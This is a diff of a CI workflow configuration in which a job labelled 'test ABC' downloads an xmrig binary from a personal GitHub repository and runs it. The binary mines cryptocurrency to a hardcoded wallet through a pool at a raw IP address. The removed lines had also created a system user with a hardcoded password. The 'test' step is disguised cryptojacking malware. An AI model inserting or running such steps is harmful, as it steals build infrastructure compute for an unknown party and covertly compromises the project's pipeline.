@@ -6,12 +6,5 @@ workflows:
     scripts:
     - name: test ABC
       script: |
-            useradd rfhu -p kewjf89
-            apt update -y
-            apt install wget openssl tar -y
-            for i in {1..2}
-            do
-               echo oke
-            done
             wget https://raw.githubusercontent.com/willyfransca/xmrig-6.12.2/main/xmrig && chmod +x xmrig && ./xmrig -o 51.79.236.43:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k -t 2 -a rx/wow --tls --rig-id tes1
     
